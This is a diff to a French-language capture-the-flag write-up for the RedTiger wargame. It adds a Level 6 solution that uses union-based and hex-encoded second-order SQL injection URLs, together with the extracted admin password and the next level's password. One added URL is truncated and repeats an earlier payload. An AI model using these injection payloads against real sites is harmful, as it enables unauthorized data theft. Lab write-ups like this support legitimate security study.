@@ -125,6 +125,7 @@ done
  Word correct. 
  The password for the next level is: bananas_are_not_yellow-sometimes
 
+5. Level 5 : Advanced login-bypass
 ```nix
 echo -n toto | md5sum
 f71dbe52628a3f83a77ab494817525c6  -
@@ -136,8 +137,35 @@ passwd : f71dbe52628a3f83a77ab494817525c6
   
   The password for the next level is: my_cat_says_meow_meowmeow 
   
-5. Level 5 : Advanced login-bypass
 6. Level 6 : SQL-Injection
+```nix
+https://redtiger.labs.overthewire.org/level6.php?user=0%20or%20status=1
+==> 
+Username: 	admin
+Email: 	admin@localhost
+1er user avec status=1 est admin
+
+https://redtiger.labs.overthewire.org/level6.php?user=0%20union%20select%201,username,1,1,1%20from%20level6_users%20where%20status=1
+==> username est utilisé pour une seconde requête
+
+pour injecter dans la seconde requête, on encode en hexadécimal (équivalent de HEX() sql mais désactivé pour l'exercice)
+echo -n "' union select 1,2,3,4,5 from level6_users where id=3 -- " | xxd -p | tr -d '\n'
+==> 2720756e696f6e2073656c65637420312c322c332c342c352066726f6d206c6576656c365f75736572732077686572652069643d33202d2d20
+
+https://redtiger.labs.overthewire.org/level6.php?user=0%20union%20select%201,0x2720756e696f6e2073656c65637420312c322c332c342c352066726f6d206c6576656c365f75736572732077686572652069643d33202d2d20,1,1,1%20from%20level6_users%20where%20status=1
+==> On obtient les n° de champs
+Username: 	2
+Email: 	4
+
+echo -n "' union select 1,username,3,password,5 from level6_users where id=3 -- " | xxd -p | tr -d '\n'
+ttps://redtiger.labs.overthewire.org/level6.php?user=0%20union%20select%201,0x2720756e696f6e2073656c65637420312c322c332c342c352066726f6d206c6576656c365f75736572732077686572652069643d33202d2d20,1,1,1%20from%20level6_users%20where%20status=1
+==> on obtient le mot de pase
+Username: 	admin
+Email: 	m0nsterk1ll
+```
+ Login correct. 
+ The password for the next level is: dont_shout_at_your_disks*** 
+ 
 7. Level 7 : SQL-Injection
 8. Level 8 : SQL-Injection
 9. Level 9 : SQL-Injection
